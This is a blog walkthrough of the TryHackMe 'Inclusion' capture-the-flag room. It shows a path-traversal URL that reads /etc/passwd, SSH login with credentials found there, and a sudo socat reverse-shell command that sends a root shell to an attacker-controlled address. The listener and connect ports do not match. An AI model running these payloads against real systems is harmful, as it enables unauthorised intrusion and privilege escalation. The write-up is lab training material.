---
title: TryHackMe Inclusion
date: 2021-07-08T14:19:01+05:30
lastmod: 2021-07-08T14:19:01+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://bit.ly/34sGFiK
#cover: /img/blog.png
cover:
  image: /img/thm.gif
  alt: "cover image"

categories:
  - TryHackMe
tags:
  - tryhackme
  - rooms
  - thm
  - inclusion

draft: false
description: TryHackMe Room inclusion, A beginner level LFI challenge. solved by Animesh Roy. this is a walkthrough. read more...

---
## inclusion

## task 01: Deploy

This is a beginner level room designed for people who want to get familiar with Local file inclusion vulnerability.

---

## Task 02: Root It

## Recon

### Nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (80):

```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-08 14:35 IST
Nmap scan report for 10.10.206.247
Host is up (0.27s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.52 seconds
```

### website

![website](https://i.imgur.com/gxhGw96.png)

this is LFI lab, let's try opening up the posts and see what we can do.

![lfi?](https://i.imgur.com/cFEhBOr.png)

we got a input paramere, where you can modify values. let's try reading out `/etc/psswd` file. this is public readble file in linux.

```bash
http://<machine-ip>/article?name=../../../../../../etc/passwd
```

Turns out we can read the local `/etc/passwd` file.

![lfi-2](https://i.imgur.com/DwC4jF7.png)

and we got a credentials commented out in file.

![creds](https://i.imgur.com/wHzTmpf.png)

trying `SSH` to access with found creds.

```bash
┌──(anir0y㉿kali)-[~/share/thm/room/inclusion]
└─$ ssh falconfeast@10.10.206.247
falconfeast@10.10.206.247's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-74-generic x86_64)
```

credentials worked! user key in `~/` dir named `user.txt`---

## Root

> we have a working `ssh` access to the server, let's try to find out to be a root.

I'm going to start with `sudo -l` command to see if `falconfeast` have any sudo run privileges.

```bash
# user can run socat with no password required. 
falconfeast@inclusion:~$ sudo -l 
Matching Defaults entries for falconfeast on inclusion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User falconfeast may run the following commands on inclusion:
    (root) NOPASSWD: /usr/bin/socat
```

Nice easy privesc here — we’ve got sudo access for socat, which is essentially a more powerful (if more complex) version of Netcat. In other words, we can use socat to send ourselves a root shell. First, on your own attacking computer, run this command:

```bash
socat file:`tty`,raw,echo=0 tcp-listen:9001
```

This will setup a socat listener on your own machine.

On the remote machine, use this command:

```bash
sudo socat tcp-connect:<your-ip-address>:1234 exec:bash,pty,stderr,setsid,sigint,sane
```

we got the flag!!!

![root](https://i.imgur.com/4K2vY1I.png)

---

## you can learn more about `socat` in this amazing room: [SHELL](https://tryhackme.com/room/introtoshells)

---

## Bonus

you could've been got both flag with `web LFI` itself. I don't know that is intented way or not. but hey! you got that option too.

* User via web:
     ![user-via-web](https://i.imgur.com/a2b5o0W.png)
* root via web:
     ![root-via-web](https://i.imgur.com/rQ4zggj.png)